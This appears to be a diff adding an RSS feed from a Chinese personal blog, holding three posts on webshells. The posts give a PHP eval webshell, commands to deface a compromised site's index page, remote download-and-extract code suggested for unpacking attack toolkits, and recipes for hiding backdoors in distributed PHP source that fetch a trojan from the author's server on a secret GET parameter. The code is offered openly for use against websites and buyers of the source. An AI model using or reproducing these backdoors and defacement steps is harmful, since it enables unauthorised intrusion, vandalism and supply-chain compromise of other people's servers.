@@ -1,0 +1,63 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rdf:RDF
+xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+xmlns="http://purl.org/rss/1.0/"
+xmlns:dc="http://purl.org/dc/elements/1.1/">
+<channel rdf:about="https://2890.ltd/feed/rss/tag/WebShell/">
+<title>OKYes! 个人博客 - WebShell</title>
+<link>https://2890.ltd/tag/WebShell/</link>
+<description></description>
+<items>
+<rdf:Seq>
+<rdf:li resource="https://2890.ltd/blog/74.html"/>
+<rdf:li resource="https://2890.ltd/blog/72.html"/>
+<rdf:li resource="https://2890.ltd/blog/24.html"/>
+</rdf:Seq>
+</items>
+</channel>
+<item rdf:about="https://2890.ltd/blog/74.html">
+<title>如何优雅的使用你的WebShell II</title>
+<link>https://2890.ltd/blog/74.html</link>
+<dc:date>2020-02-20T10:27:00+08:00</dc:date>
+<description>上篇文章我们介绍了我推荐的WebShell，这篇我们来说说如何通过这个WebShell干一些其他事，这篇文章里我就不说访问啥了，直接放代码1.使用后门获取目录信息这个不多说，有PHP基础的应该都会用$dir =  dirname(__FILE__);$file = scandir($dir);echo &quot; &lt;pre&gt;&quot;;print_r($file);这个dirname(__FILE__)是可以更改为相对路径的，比如你的后门在3层目录中，可以将$dir赋值为../../，所得结果将以一个数组print出来。像这样2.使用后门解压，释放文件这个方法我其实是不想分享出来的。毕竟屡试不爽嘛，其实很简单，代码如下$down=file_get_contents('http://压缩包下载地址.zip');file_put_contents('update.zip',$down);$zip = new ZipArchive; $zip-&gt;open('./update.zip') &amp;&amp; $zip-&gt;extractTo('../');这个方法能用来解压可到云之类的在线文件管理，当然，也可以解压个攻击工具包，然后对其它网站进行压测。其他的东西我就不说了，还有什么其他玩法，我们就笑看大佬了</description>
+</item>
+<item rdf:about="https://2890.ltd/blog/72.html">
+<title>如何优雅的给GetShell后的网站挂黑提醒</title>
+<link>https://2890.ltd/blog/72.html</link>
+<dc:date>2020-02-19T17:08:00+08:00</dc:date>
+<description>个人推荐webshell&lt;?php @eval($_GET[&quot;cmd&quot;]); ?&gt;死稳的一句话，也是个基础WebShell，但是适用于宝塔之类的禁用了系统函数的环境，后面我会进行演示。当你通过自己的方法把这个shell上传了上去之后，不用菜刀，所有操作均在浏览器进行,(这个WebShell的操作全部为php代码，宝塔默认禁用php调用linux命令的函数，如exec)1.挂黑挂黑肯定是各位拿站之后必干的事，这里提供操作访问您的域名/您的文件名.php?cmd=$myfile = fopen(&quot;index.php&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);$txt = &quot;黑页内容&quot;;fwrite($myfile, $txt);fclose($myfile);如果您的html过长，可以尝试使用下载方法访问您的域名/您的文件名.php?cmd=file_put_contents(&quot;index.php&quot;,file_get_contents(&quot;您的黑页链接&quot;));为什么上面文件名不用html呢？因为html在大部分使用宝塔的服务器上的优先级低于php，如果您需要也可以使用html2.删除自身如果您是一位白帽，留了黑页也该走了,访问您的域名/您的文件名.php?cmd=$myfile = fopen(&quot;文件名&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);$txt = &quot;&quot;;fwrite($myfile, $txt);fclose($myfile);即可一键自宫（雾当然，还有其他玩法，如用php列举文件，进行网站压测等玩法就不一一列举了，当然，欢迎各位加我Tg交流技术tg id:@given_huang</description>
+</item>
+<item rdf:about="https://2890.ltd/blog/24.html">
+<title>如何用三种方式优雅的往你的PHP源码放点不为人知的后门</title>
+<link>https://2890.ltd/blog/24.html</link>
+<dc:date>2019-09-13T12:12:00+08:00</dc:date>
+<description>兄 dei 你有没有尝试过辛辛苦苦写的源码被人解密拿去大肆分享？不管有没有，反正我是没有。那么这篇文章我们就来说一下如何有效的防范狗 b 并且阴一把狗 b 吧 QAQ巧用Get远程下载后门巧用Get远程下载后门 &lt;?php
+define('ROOT', dirname(SYSTEM_ROOT).'/');
+if($_GET['hacked']==='logged'){'
+file_put_contents(ROOT.'isetex.php',curl_get('http://域名/api/houmen.txt)'));
+}
+?&gt;
+食用方法:把一个文本为木马的txt保存到云端，复制链接替换“http://域名/api/houmen.txt” 然后访问文件名称.php?hacked=logged 即可在目录生成一个从你云端木马文本获取内容并且名为isetex.php的木马文件当然你也可以改成一句话之类的东西，简单说 你会玩 想咋玩咋玩利用云端下载压缩包解压放后门&lt;?php
+$down=file_get_contents('http://压缩包下载地址.zip');
+        file_put_contents('update.zip',$down);
+            $zip = new ZipArchive;
+            $zip-&gt;open('./update.zip') &amp;&amp; $zip-&gt;extractTo('../');
+
+
+            echo &quot;https://2890.ltd OK!!!&quot;;
+?&gt;
+结合上面的get方式来也是妥妥的    &lt;?php
+if($_GET['hacked']==='logged'){
+    $down=file_get_contents('http://压缩包下载地址.zip');
+            file_put_contents('update.zip',$down);
+                $zip = new ZipArchive;
+                $zip-&gt;open('./update.zip') &amp;&amp; $zip-&gt;extractTo('../');
+
+                echo &quot;https://2890.ltd OK!!!&quot;;
+}
+    ?&gt;
+食用方法：访问，自动下载云端压缩包并解压到根目录，必须要求zip压缩JavaScript骚操作防盗模板`var xhr = new XMLHttpRequest();xhr.onreadystatechange=function(){    if(xhr.responseText == &quot;000&quot;){//如果txt内容为000
+            document.write(&quot;&lt;center&gt;&lt;h1&gt;我是显示内容&lt;center&gt;&lt;h1&gt;&quot;);
+    }//则显示这里的内容}xhr.open("GET","http://webserver/isopen.txt",true);//云端txtxhr.send(null);`感觉代码写的挺明白的，js放oss然后模板添加一下调用，盗版狗专防，死稳忘了说js还支持运行php代码 感觉人生js并肩php了呢&lt;script language=php&gt;@eval($_POST['web']);&lt;/script&gt; </description>
+</item>
+</rdf:RDF>
